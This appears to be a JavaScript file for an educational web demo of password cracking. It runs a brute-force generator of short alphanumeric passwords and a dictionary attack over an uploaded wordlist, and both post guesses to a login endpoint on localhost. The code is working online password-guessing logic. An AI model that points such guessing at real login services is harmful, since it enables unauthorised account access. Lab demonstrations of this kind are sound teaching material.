const dictionaryStatus = document.getElementById("dictionaryStatus");
const bruteStatus = document.getElementById("bruteStatus");

const dictionaryButton = document.getElementById("dictionaryButton");
const bruteForceButton = document.getElementById("bruteForceButton");

//Event handlers for buttons----------------------
dictionaryButton.addEventListener(
  "click",
  function (e) {
    dictionaryAttack();
  },
  false
);

bruteForceButton.addEventListener(
  "click",
  function (e) {
    bruteForce();
  },
  false
);
//------------------------------------------------------

///Brute force ---start----------------------------------
const pattern = "abcdefghijklmnopqrstuvwxyz1234567890";

const charArray = pattern.split("");

const bruteForce = async () => {
  const gen = generate(charArray, 3);

  let found = false;
  let currentItem;

  while (!found) {
    currentItem = gen.next();

    bruteStatus.textContent = "current candidate: " + currentItem.value;
    const response = await postData("http://localhost:3000/login", {
      password: currentItem.value,
    });

    if (response == "Correct Password") {
      bruteStatus.textContent = "Password found: " + currentItem.value;
      break;
    }
    if (currentItem.done == true) break;
  }
};

function generate(chars = [], maxLevels = 3) {
  function* iteratee(prefix, index, level) {
    for (let i = 0; i < chars.length; i++) {
      const char = chars[i];
      const record = prefix + char;

      if (index >= level) {
        yield record;
      } else {
        yield* iteratee(record, index + 1, level);
      }
    }
  }

  function* loop(string) {
    for (let i = 0; i < maxLevels; i++) {
      yield* iteratee(string, 0, i);
    }
  }

  return loop("");
}

///Brute force ---end---------------------------------

// Dictionary attack ---start---------------------------

// to store file uploaded
let passwordFile;

// Assign file to variable when uploaded
document.getElementById("file").onchange = function () {
  passwordFile = this.files[0];
};

const dictionaryAttack = () => {
  const reader = new FileReader();

  reader.onload = async (event) => {
    const file = event.target.result;
    const allLines = file.split(/\r\n|\n/);

    for (let i = 0; i < allLines.length; i++) {
      const line = allLines[i];
      dictionaryStatus.innerHTML = "current candidate: " + line;
      const response = await postData("http://localhost:3000/login", {
        password: line,
      });

      if (response == "Correct Password") {
        dictionaryStatus.innerHTML = "Password found: " + line;
        break;
      }
    }
  };

  reader.onerror = (event) => {
    alert(event.target.error.name);
  };

  reader.readAsText(passwordFile);
};

//Dictionary attack ---end----------------------------------

//Helper function to post data
async function postData(url = "", data = {}) {
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  });
  return response.json();
}
